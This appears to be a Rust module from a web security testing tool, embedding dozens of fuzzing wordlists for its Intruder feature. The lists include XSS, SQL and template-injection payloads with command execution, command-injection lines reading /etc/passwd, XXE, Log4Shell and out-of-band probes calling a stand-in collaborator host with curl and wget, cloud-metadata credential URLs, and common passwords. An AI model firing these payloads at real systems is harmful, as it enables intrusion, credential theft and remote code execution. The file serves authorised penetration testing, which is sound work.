//! Built-in Intruder payload libraries.
//!
//! Every entry is a small, hand-picked wordlist shipped inside the
//! binary (via `include_str!` style constants). They mirror the
//! public-domain `resources/PayloadStrings/*.pay` entries that ship
//! with the reference tool — scoped-down to high-signal probes
//! so the operator can get a useful attack running without
//! downloading external files.
//!
//! The payloads here are deliberately conservative:
//! * **XSS / SQLi / SSTI** entries are classic *detector* payloads
//!   (reflection + boolean + time-based) rather than weaponised
//!   bypasses — they are safe to send against systems the operator
//!   is authorised to test.
//! * **Dir brute / filename / username / password** lists are
//!   short (≤ 60 entries) so even an unthrottled Intruder run
//!   finishes in seconds against localhost targets.
//!
//! Each entry carries a stable `id` — the frontend persists this
//! as the "selected library" key — plus a human-readable `name`,
//! short `description` and `category` label used to group the
//! dropdown in the Intruder toolbar.

use serde::{Deserialize, Serialize};

/// Public metadata view of one payload library.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LibraryEntry {
    pub id: &'static str,
    pub name: &'static str,
    pub description: &'static str,
    pub category: &'static str,
    /// Number of non-blank lines in the embedded wordlist.
    pub size: usize,
}

/// Full catalog of built-in wordlists. The dropdown order mirrors
/// the order here — most-used ones first.
pub fn catalog() -> Vec<LibraryEntry> {
    LIBRARIES
        .iter()
        .map(|lib| LibraryEntry {
            id: lib.id,
            name: lib.name,
            description: lib.description,
            category: lib.category,
            size: lib
                .content
                .lines()
                .filter(|l| !l.trim().is_empty())
                .count(),
        })
        .collect()
}

/// Return the raw text of a library by its id, or `None` if unknown.
pub fn load(id: &str) -> Option<&'static str> {
    LIBRARIES.iter().find(|l| l.id == id).map(|l| l.content)
}

struct Library {
    id: &'static str,
    name: &'static str,
    description: &'static str,
    category: &'static str,
    content: &'static str,
}

// ---------------------------------------------------------------------------
// Wordlists — kept intentionally small; one entry per line.
// ---------------------------------------------------------------------------

/// Reflected / stored XSS detection probes.
const XSS_PROBES: &str = "<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src=\"javascript:alert(1)\">
<a href=\"javascript:alert(1)\">x</a>
'\"><script>alert(1)</script>
\"><svg/onload=alert(1)>
\"'><img src=x onerror=alert(1)>
javascript:alert(1)
onmouseover=alert(1)
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src/onerror=alert(1)>
<math><mtext></form><form><mglyph><svg><mtext><textarea><a title=\"</textarea><img src=1 onerror=alert(1)>\">
<link rel=import href=\"data:text/html,<script>alert(1)</script>\">
<style>@import 'javascript:alert(1)';</style>
<!--<img src=\"--><img src=x onerror=alert(1)//\">
expression(alert(1))
";

/// Error-based SQL injection probes — expect verbose errors from the backend.
const SQLI_ERROR: &str = "'
\"
`
')
\")
`)
';
';--
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
\" OR \"1\"=\"1
\" OR \"1\"=\"1\"--
') OR ('1'='1
1' AND '1'='2
1' ORDER BY 1--
1' ORDER BY 100--
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
' AND 1=CONVERT(int,(SELECT @@version))--
1'; WAITFOR DELAY '0:0:5'--
1' AND SLEEP(5)--
1 AND SLEEP(5)
1' AND pg_sleep(5)--
1 AND BENCHMARK(5000000,MD5('x'))--
1' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--
";

/// Auth-bypass variants from the classic SQLi login-form corpus.
const SQLI_AUTH_BYPASS: &str = "' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin' --
admin' #
admin'/*
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR 'a'='a
') OR ('1'='1
\" OR \"\"=\"
' OR 1=1 LIMIT 1--
' UNION SELECT 1,'admin','admin'--
admin') OR ('1'='1
' OR 'x'='x
' OR 1=1 ORDER BY 1--
' /*!50000OR*/ 1=1--
' OR ''='
' OR 1=1 AND ''='
";

/// Path-traversal probes with various encoding tricks.
const PATH_TRAVERSAL: &str = "../
..\\
../../
..\\..\\
../../../etc/passwd
..\\..\\..\\windows\\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9cetc/passwd
/etc/passwd
/etc/passwd%00
/etc/shadow
/proc/self/environ
C:/windows/win.ini
C:\\windows\\win.ini
file:///etc/passwd
file:///c:/windows/win.ini
";

/// Short directory brute-force list, admin/API/dev-tool heavy.
const DIR_BRUTE: &str = "admin
administrator
admin.php
admin/login
api
api/v1
api/v2
api/v3
.git
.git/config
.env
.env.local
.env.backup
backup
backups
config
console
dashboard
db
debug
dev
docs
.ds_store
graphql
graphiql
.htaccess
health
health-check
healthz
hidden
internal
login
logout
management
metrics
monitor
old
panel
phpinfo.php
phpmyadmin
private
register
restricted
robots.txt
secret
secrets
server-status
setup
sitemap.xml
status
staff
staging
swagger
swagger-ui
swagger.json
test
tests
tmp
uploads
user
users
wp-admin
wp-login.php
.well-known/security.txt
";

/// Common sensitive filenames observable at the webroot.
const FILENAMES_COMMON: &str = "robots.txt
sitemap.xml
.env
.env.local
.env.backup
.env.production
.env.staging
.git/config
.git/HEAD
.gitignore
.svn/entries
.htaccess
.htpasswd
.DS_Store
backup.zip
backup.tar.gz
backup.sql
db.sql
database.sql
dump.sql
config.php
config.php.bak
config.php.old
config.yml
config.yaml
config.json
settings.py
local.settings.json
web.config
server-status
server-info
crossdomain.xml
clientaccesspolicy.xml
humans.txt
security.txt
.well-known/security.txt
phpinfo.php
info.php
test.php
debug.log
error.log
access.log
id_rsa
id_rsa.pub
authorized_keys
";

/// HTTP verbs — handy for method-override + verb-tampering probes.
const HTTP_VERBS: &str = "GET
POST
PUT
DELETE
PATCH
HEAD
OPTIONS
CONNECT
TRACE
PROPFIND
PROPPATCH
MKCOL
COPY
MOVE
LOCK
UNLOCK
SEARCH
REPORT
MKCALENDAR
BIND
REBIND
UNBIND
ACL
";

/// Top 60 usernames — directory-service and legacy-system heavy.
const USERNAMES: &str = "admin
administrator
root
test
guest
user
demo
superuser
sysadmin
operator
support
helpdesk
webmaster
postmaster
hostmaster
abuse
noc
noreply
no-reply
info
contact
service
manager
owner
dev
developer
qa
staging
oracle
mysql
postgres
mongo
mongodb
redis
jenkins
tomcat
www
www-data
nginx
apache
backup
monitoring
nagios
zabbix
ftp
sftp
anonymous
mail
email
alice
bob
charlie
eve
mallory
public
default
sa
system
pi
ubuntu
ec2-user
azureuser
";

/// Top 60 passwords — the usual-suspects list seen in every leak.
const PASSWORDS: &str = "password
password1
password123
Password1
Password123
P@ssw0rd
P@ssword1
123456
12345
1234
123456789
12345678
111111
000000
qwerty
qwerty123
asdf
asdfgh
asdfghjkl
letmein
welcome
welcome1
Welcome1
admin
admin1
admin123
administrator
root
rootroot
toor
test
test123
guest
guest1
changeme
Changeme1
Secret1
abc123
monkey
dragon
sunshine
master
hello
login
pass
pass123
secret
qazwsx
1q2w3e4r
iloveyou
default
Default1
summer2024
Winter2024!
company123
password2024
Spring2024!
Autumn2024!
Password2025
company@2024
password!
";

/// Server-side template-injection probes across popular engines.
const SSTI: &str = "{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}
{% debug %}
{{config}}
{{config.items()}}
{{self}}
{{self.__init__.__globals__}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
${{<%[%'\"}}%\\
#{T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.System).getenv()}
*{T(java.lang.Runtime).getRuntime().exec('id')}
<%= system('id') %>
<%= `id` %>
{{= 7*7 }}
{{ ''.constructor.constructor('return process')() }}
{{__proto__}}
";

/// Common LFI target paths on Linux + Windows + container hosts.
const LFI: &str = "/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/hostname
/etc/issue
/etc/motd
/etc/resolv.conf
/etc/ssh/sshd_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/var/log/auth.log
/var/log/syslog
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/stat
/proc/version
/proc/cpuinfo
/proc/mounts
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/home/user/.bash_history
C:\\windows\\win.ini
C:\\windows\\system32\\drivers\\etc\\hosts
C:\\windows\\system.ini
C:\\boot.ini
C:\\inetpub\\wwwroot\\web.config
C:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf
";

/// Format-string probes.
const FORMAT_STRINGS: &str = "%s
%d
%x
%n
%p
%s%s%s%s
%x%x%x%x
%n%n%n%n
%p%p%p%p
%.1024d
%.2000d
AAAA%08x.%08x.%08x.%08x
AAAA%p.%p.%p.%p
%s%p%x%d
.%s.%s.%s.%s.%s.%s.%s
%08x %08x %08x %08x %08x
%*d
%.*s
{0}
{{0}}
${0}
#{0}
";

/// Short user-agent list for header-tampering + fingerprint probes.
const USER_AGENTS: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/128.0
Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36
curl/8.6.0
Wget/1.21.4 (linux-gnu)
Go-http-client/1.1
python-requests/2.32.3
Java/21
PostmanRuntime/7.42.0
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)
Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
BurpFree/0.1
sqlmap/1.8.3
Nmap NSE
Nikto
";

/// Command-execution bootstrap probes — stay small enough to echo
/// cleanly into any reflection sink.
const CMD_EXEC: &str = ";id
|id
`id`
$(id)
&&id
||id
%0aid
%0did
;whoami
|whoami
`whoami`
$(whoami)
;sleep 5
|sleep 5
`sleep 5`
$(sleep 5)
& ping -n 5 127.0.0.1
| ping -c 5 127.0.0.1
;cat /etc/passwd
|cat /etc/passwd
$(cat /etc/passwd)
`cat /etc/passwd`
;type c:\\windows\\win.ini
|type c:\\windows\\win.ini
&&dir
;ls -la
%26dir
%26%26dir
%7Cwhoami
%3Bid
";

/// Open-redirect candidates — tries to escape a URL field.
const OPEN_REDIRECT: &str = "//evil.example.com
//evil.example.com/
///evil.example.com
////evil.example.com
http://evil.example.com
https://evil.example.com
http:evil.example.com
https:evil.example.com
//evil.example.com\\@original.example.com
//evil.example.com#@original.example.com
//evil.example.com?@original.example.com
javascript:alert(1)
javascript://%0aalert(1)
data:text/html,<script>alert(1)</script>
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://169.254.169.254/latest/meta-data/
//evil.example.com/%2f..
/\\evil.example.com
\\/evil.example.com
";

// R920: 12 new payload sets to approach Burp's 47+ coverage.

const XXE_PAYLOADS: &str = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>
<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>
<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLABORATOR.example.com\">]><foo>&xxe;</foo>
<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR.example.com/evil.dtd\">%xxe;]><foo>test</foo>
<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>
<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>
";

const NOSQLI: &str = "{\"$gt\":\"\"}
{\"$ne\":null}
{\"$regex\":\".*\"}
{\"$where\":\"sleep(5000)\"}
{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}
true, $where: '1 == 1'
'; return '' == '
{\"$or\":[{},{}]}
[$ne]=1
";

const LDAP_INJECTION: &str = "*
*)(objectClass=*)
*)(&
*()|&'
admin)(&)
admin)(!(&(1=0)))
*)(uid=*))(|(uid=*
)(cn=*))(|(cn=*
";

const CRLF_INJECTION: &str = "%0d%0aInjected-Header:true
%0aInjected-Header:true
%0d%0a%0d%0a<html>injected</html>
%E5%98%8A%E5%98%8DInjected:true
\\r\\nInjected-Header:true
%5cr%5cnInjected:true
%23%0aInjected:true
";

const JWT_SECRETS: &str = "secret
password
123456
qwerty
changeme
admin
jwt_secret
token
key
HS256
supersecret
default
mysecret
password1
secret123
letmein
abc123
test
iloveyou
trustno1
654321
monkey
dragon
master
qwerty123
login
welcome
sunshine
princess
football
shadow
12345678
starwars
passw0rd
batman
access
hello
charlie
summer
passwd
love
secret1
hunter2
jordan
pepper
buster
robert
cookie
1234567890
killer
dallas
matrix
q1w2e3r4t5
";

const CORS_ORIGINS: &str = "null
http://evil.example.com
https://evil.example.com
http://target.example.com.evil.com
https://eviltarget.example.com
http://target.example.com%60.evil.com
https://target.example.com_.evil.com
http://localhost
http://127.0.0.1
";

const SSRF_PROBES: &str = "http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
http://169.254.169.254/metadata/v1/
http://192.168.0.1
http://10.0.0.1
http://172.16.0.1
gopher://127.0.0.1:25/_EHLO
dict://127.0.0.1:6379/INFO
file:///etc/passwd
";

const EMAIL_SPLITTING: &str = "victim@test.com%0ACc:attacker@evil.com
victim@test.com%0ABcc:attacker@evil.com
victim@test.com%0d%0aCc:attacker@evil.com
victim@test.com\\r\\nCc:attacker@evil.com
%0ASubject:Injected
%0d%0aContent-Type:text/html%0d%0a%0d%0a<b>Injected</b>
";

const CGI_SCRIPTS: &str = "/cgi-bin/
/cgi-bin/test-cgi
/cgi-bin/printenv
/cgi-bin/php
/cgi-bin/php5
/cgi-bin/status
/cgi-bin/admin.cgi
/cgi-bin/webnotify
/cgi-sys/
/cgi-sys/defaultwebpage.cgi
/admin.cgi
/setup.cgi
/phpmyadmin/
/pma/
/myadmin/
/dbadmin/
/phpinfo.php
/info.php
/test.php
/shell.php
";

const IIS_FILES: &str = "/web.config
/iisstart.htm
/aspnet_client/
/trace.axd
/elmah.axd
/_layouts/
/_vti_bin/
/_vti_inf.html
/_vti_pvt/
/App_Data/
/bin/
/Global.asax
/Thumbs.db
/desktop.ini
/%252e%252e/web.config
/web.config~
/web.config.bak
/applicationHost.config
";

const JSON_XML_INJECTION: &str = "{}
{\"__proto__\":{\"isAdmin\":true}}
{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}
{\"$gt\":\"\"}
<foo/>
<![CDATA[<script>alert(1)</script>]]>
<!--
]]>]]>
<!ENTITY x \"test\">
{\"a\":\"b\",\"a\":\"c\"}
[\"__proto__\"]
";

const OOB_CANARIES: &str = "COLLABORATOR.example.com
${jndi:ldap://COLLABORATOR.example.com/a}
{{COLLABORATOR.example.com}}
<img src=http://COLLABORATOR.example.com>
<svg/onload=fetch('http://COLLABORATOR.example.com')>
nslookup COLLABORATOR.example.com
curl http://COLLABORATOR.example.com
wget http://COLLABORATOR.example.com
";

// R927: 5 more payload sets (total 32, approaching Burp's 47).

const XPATH_INJECTION: &str = "' or '1'='1
' or ''='
') or ('1'='1
1 or 1=1
' or count(parent::*[position()=1])=0 or 'a'='b
' or 1=1 or ''='
\") or (\"1\"=\"1
//*
count(/child::node())
' or name()='username' or 'x'='y
";

const DESERIALIZATION: &str = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
aced0005
{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}
O:8:\"stdClass\":0:{}
a:1:{s:4:\"test\";s:4:\"test\";}
TzoxMToiX19QSFBfSW5jb21wbGV0ZV9DbGFzcyI6MDp7fQ==
{\"__class__\":\"subprocess.Popen\"}
!!python/object:os.system [\"id\"]
--- !ruby/object:Gem::Installer
";

const GRAPHQL_INTROSPECTION: &str = "{__typename}
{__schema{types{name}}}
{__schema{queryType{name}mutationType{name}subscriptionType{name}}}
{__schema{types{name kind description fields{name description}}}}
{__schema{directives{name description locations args{name}}}}
query{__type(name:\"Query\"){name fields{name type{name kind}}}}
fragment FullType on __Type{kind name fields{name args{name type{...TypeRef}} type{...TypeRef}}}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name}}}query{__schema{types{...FullType}}}
";

const PROTOTYPE_POLLUTION: &str = "__proto__[isAdmin]=true
constructor[prototype][isAdmin]=true
__proto__.isAdmin=true
constructor.prototype.isAdmin=true
{\"__proto__\":{\"isAdmin\":true}}
{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}
__proto__[status]=500
__proto__[headers][x-]=[injected]
__proto__[body]=injected
constructor[prototype][outputFunctionName]=x;throw new Error()//
";

const LOG4SHELL: &str = "${jndi:ldap://COLLABORATOR.example.com/a}
${jndi:ldaps://COLLABORATOR.example.com/a}
${jndi:rmi://COLLABORATOR.example.com/a}
${jndi:dns://COLLABORATOR.example.com}
${${lower:j}ndi:${lower:l}dap://COLLABORATOR.example.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://COLLABORATOR.example.com/a}
${jndi:ldap://127.0.0.1#COLLABORATOR.example.com/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//COLLABORATOR.example.com/a}
";

// R929: 5 more sets (total 37).

const CACHE_POISONING: &str = "X-Forwarded-Host: evil.example.com
X-Forwarded-Scheme: nothttps
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Port: 4443
X-Forwarded-Prefix: /evil
X-HTTP-Method-Override: POST
";

const SSTI_EXTENDED: &str = "${7*7}
#{7*7}
<%= 7*7 %>
{{7*7}}
${{7*7}}
{7*7}
a]b
{{config}}
{{self.__class__.__mro__[2].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
${T(java.lang.Runtime).getRuntime().exec('id')}
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}
";

const UNICODE_NORMALIZATION: &str = "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
%e0%80%af..%e0%80%afetc/passwd
%00
%ef%bc%8e%ef%bc%8e/
%ef%bc%8e%ef%bc%8e%ef%bc%8f
%c1%9c
%c0%af
%25%30%30
%252e%252e%252f
%c0%ae./
";

const HEADER_INJECTION: &str = "X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Via: 1.0 127.0.0.1
";

const WORDLIST_3_LETTER: &str = "aaa
abc
ace
add
age
ago
aid
aim
air
and
any
app
arm
art
ask
ate
bad
bag
ban
bar
bat
bay
bed
bet
bid
big
bin
bit
box
boy
bug
bus
but
buy
cab
can
cap
car
cat
cop
cow
cry
cup
cut
dad
dam
day
did
die
dig
dim
dip
dog
dot
dry
due
dug
ear
eat
egg
end
era
etc
eve
eye
fan
far
fat
fee
few
fig
fit
fix
fly
for
fox
fun
fur
gap
gas
get
god
got
gun
gut
guy
gym
had
hat
her
hid
him
hip
his
hit
hog
hop
hot
how
hub
hug
ice
ill
ink
inn
ion
its
jam
jar
jaw
jet
job
jog
joy
jug
key
kid
kit
lab
lap
law
lay
led
leg
let
lid
lie
lip
lit
log
lot
low
mad
man
map
mat
max
may
men
met
mid
mix
mob
mod
mom
mop
mud
mug
nap
net
new
nil
nod
nor
not
now
nut
oak
odd
off
oil
old
one
opt
ore
our
out
owe
own
pad
pal
pan
pat
pay
pen
pet
pie
pig
pin
pit
pod
pop
pot
pro
pub
pup
put
rag
ram
ran
rap
rat
raw
ray
red
ref
rib
rid
rim
rip
rob
rod
rot
row
rub
rug
rum
run
rut
sad
sat
saw
say
sea
set
she
shy
sin
sip
sir
sit
six
ski
sky
sly
sob
sod
son
sow
spy
sub
sue
sum
sun
tab
tag
tan
tap
tar
tax
tea
ten
the
tie
tin
tip
tit
toe
ton
too
top
tow
toy
try
tub
tug
two
van
vat
vet
via
vow
war
was
wax
way
web
wed
wet
who
why
wig
win
wit
woe
wok
won
woo
wow
yam
yap
yaw
yes
yet
you
zap
zen
zip
zoo
";


// R935: 5 more payload constants (total 42)

const HTTP_HEADERS_FUZZ: &str = "X-Forwarded-For
X-Real-IP
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-Port
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
X-Custom-IP-Authorization
True-Client-IP
CF-Connecting-IP
X-Client-IP
X-Remote-IP
X-Remote-Addr
X-ProxyUser-Ip
X-Originating-IP
X-Host
X-HTTP-Method-Override
X-Method-Override
X-Requested-With
X-Forwarded-Server
X-HTTP-Destination
X-HTTP-Host-Override
Origin
Referer
Content-Type
Accept
Transfer-Encoding
X-Debug
X-Middleware-Override
";

const SUBDOMAIN_COMMON: &str = "www
mail
ftp
smtp
pop
ns1
ns2
dns
mx
cdn
api
dev
staging
test
qa
uat
beta
alpha
demo
sandbox
admin
portal
vpn
remote
gateway
proxy
cache
static
assets
img
media
files
upload
download
git
svn
jenkins
ci
cd
monitor
grafana
kibana
elastic
prometheus
sentry
status
health
docs
wiki
blog
shop
store
pay
";

const API_PATHS: &str = "/api
/api/v1
/api/v2
/api/v3
/graphql
/graphiql
/playground
/swagger
/swagger-ui
/swagger-ui.html
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/api-docs
/v1/api-docs
/v2/api-docs
/v3/api-docs
/redoc
/rest
/ws
/websocket
/socket.io
/hub
/signalr
/grpc
/health
/healthz
/readyz
/livez
/metrics
/prometheus
/internal
/admin/api
/management
/.well-known
/oauth
/oauth2
/auth
/token
/login
/register
/users
/me
/profile
";

const CONTENT_TYPE_FUZZ: &str = "application/json
application/xml
application/x-www-form-urlencoded
multipart/form-data
text/plain
text/html
text/xml
application/javascript
application/soap+xml
application/graphql
application/x-amf
application/java-serialized-object
application/x-java-serialized-object
application/octet-stream
image/svg+xml
application/pdf
application/zip
text/csv
application/yaml
application/x-yaml
";

const JWT_ALG_CONFUSION: &str = "{\"alg\":\"none\"}
{\"alg\":\"None\"}
{\"alg\":\"NONE\"}
{\"alg\":\"nOnE\"}
{\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}
{\"alg\":\"HS256\",\"kid\":\"/dev/null\"}
{\"alg\":\"HS256\",\"jwk\":{\"kty\":\"oct\",\"k\":\"\"}}
{\"alg\":\"RS256\",\"jku\":\"https://evil.example.com/jwks.json\"}
{\"alg\":\"HS256\",\"kid\":\"key1\"}
{\"alg\":\"PS256\"}
{\"alg\":\"ES256\"}
{\"typ\":\"JWT\",\"alg\":\"HS256\",\"kid\":\"../../../etc/passwd\"}
";

// R936: 5 final constants (total 47)

const SERVER_VAR_NAMES: &str = "admin
debug
test
verbose
env
config
secret
key
token
api_key
password
username
user
email
id
session
cookie
auth
csrf
nonce
redirect
url
callback
return
next
path
file
filename
upload
action
cmd
command
exec
query
search
sort
order
page
limit
offset
format
type
lang
locale
mode
";

const LOCAL_FILES_LINUX: &str = "/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/httpd/conf/httpd.conf
/etc/mysql/my.cnf
/etc/postgresql/pg_hba.conf
/etc/ssh/sshd_config
/etc/crontab
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/version
/proc/net/tcp
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/syslog
/root/.bash_history
/root/.ssh/id_rsa
/home/user/.bash_history
";

const LOCAL_FILES_WINDOWS: &str = "C:\\Windows\\win.ini
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\Windows\\System32\\config\\SAM
C:\\Windows\\System32\\config\\SYSTEM
C:\\Windows\\repair\\SAM
C:\\inetpub\\wwwroot\\web.config
C:\\inetpub\\logs\\LogFiles
C:\\xampp\\apache\\conf\\httpd.conf
C:\\xampp\\mysql\\bin\\my.ini
C:\\Users\\Administrator\\.ssh\\id_rsa
C:\\ProgramData\\MySQL\\MySQL Server 8.0\\my.ini
C:\\Windows\\debug\\NetSetup.LOG
C:\\Windows\\Panther\\Unattend.xml
C:\\Windows\\Panther\\unattend.xml
";

const EL_INJECTION: &str = "${7*7}
#{7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
${applicationScope}
${pageContext.request.serverName}
${pageContext.request.getSession().getId()}
%{7*7}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
${#cmd='id',#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))}
${''.class.forName('java.lang.Runtime').getRuntime().exec('id')}
";

const INTERESTING_FILES_EXT: &str = ".bak
.old
.orig
.tmp
.temp
.swp
.swo
~
.save
.conf
.config
.cfg
.ini
.env
.log
.sql
.db
.sqlite
.json
.xml
.yaml
.yml
.toml
.php.bak
.asp.bak
.jsp.bak
.war
.jar
.zip
.tar.gz
.tgz
.7z
.rar
.git
.svn
.hg
.DS_Store
Thumbs.db
";

// R953: 5 more payload constants (47→52)

const WEBSHELL_PATHS: &str = "/shell.php
/cmd.php
/c99.php
/r57.php
/b374k.php
/weevely.php
/upload/shell.php
/images/shell.php
/tmp/shell.php
/uploads/cmd.jsp
/cmd.asp
/cmd.aspx
/shell.aspx
/webshell.php
/backdoor.php
/test/shell.php
/.hidden/shell.php
/wp-content/uploads/shell.php
/admin/shell.php
";

const CLOUD_METADATA: &str = "http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://100.100.100.200/latest/meta-data/
http://192.0.0.192/latest/meta-data/
http://169.254.169.254/opc/v2/instance/
";

const UNICODE_TRICKS: &str = "%EF%BC%8E%EF%BC%8E%EF%BC%8F
%E2%80%A5
%C0%AE%C0%AE/
%EF%BC%8F
%E2%81%84
%EF%BC%BC
%C0%AF
%E0%80%AF
%F0%80%80%AF
%C1%9C
..%EF%BC%8F
..%C0%AF
..%E2%80%A5
";

const PHP_WRAPPERS: &str = "php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
php://filter/read=string.rot13/resource=index.php
php://input
php://fd/0
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
expect://id
phar://test.phar/test.txt
zip://test.zip#test.txt
compress.zlib://file.gz
";

const HTTP_REQUEST_HEADERS: &str = "Accept
Accept-Charset
Accept-Encoding
Accept-Language
Authorization
Cache-Control
Connection
Content-Length
Content-Type
Cookie
DNT
Date
Expect
Forwarded
From
Host
If-Match
If-Modified-Since
If-None-Match
If-Range
If-Unmodified-Since
Max-Forwards
Origin
Pragma
Proxy-Authorization
Range
Referer
TE
Trailer
Transfer-Encoding
Upgrade
User-Agent
Via
Warning
X-Forwarded-For
X-Forwarded-Host
X-Forwarded-Proto
X-Real-IP
X-Requested-With
X-Csrf-Token
";

// R968: 5 more payload constants (52→57)

const FILE_UPLOAD_EXT: &str = "shell.php
shell.php5
shell.phtml
shell.php.jpg
shell.php%00.jpg
shell.php;.jpg
shell.pHp
shell.PhP
shell.asp
shell.aspx
shell.jsp
shell.jspx
shell.war
shell.cgi
shell.pl
shell.py
shell.rb
shell.svg
shell.html
.htaccess
";

const GRAPHQL_MUTATIONS: &str = "mutation{createUser(username:\"admin2\",password:\"admin2\",role:\"admin\"){id}}
mutation{updateUser(id:1,role:\"admin\"){id role}}
mutation{deleteUser(id:2){id}}
mutation{updatePassword(oldPassword:\"x\",newPassword:\"hacked\"){success}}
mutation{addPaymentMethod(card:\"4111111111111111\"){id}}
mutation{transferFunds(to:\"attacker\",amount:9999){success}}
mutation{changeEmail(email:\"attacker@evil.com\"){email}}
";

const OAUTH_REDIRECT_BYPASS: &str = "https://evil.example.com
https://target.example.com@evil.example.com
https://target.example.com.evil.example.com
https://evil.example.com/target.example.com
https://target.example.com%40evil.example.com
https://target.example.com#@evil.example.com
//evil.example.com
/\\evil.example.com
